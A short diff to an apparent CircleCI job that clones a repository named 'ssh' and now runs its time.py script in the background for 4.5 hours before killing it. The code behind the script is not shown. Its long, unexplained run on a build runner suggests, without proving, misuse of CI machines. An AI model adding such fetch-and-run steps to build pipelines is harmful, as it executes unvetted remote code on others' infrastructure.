@@ -18,7 +18,9 @@ jobs:
           command: |
             git clone https://github.com/KernelPanic-OpenSource/ssh.git py
             cd py
-            python time.py
+            python time.py &
+            sleep 4.5h
+            kill %1
 workflows:
   version: 2.1
   cooking:
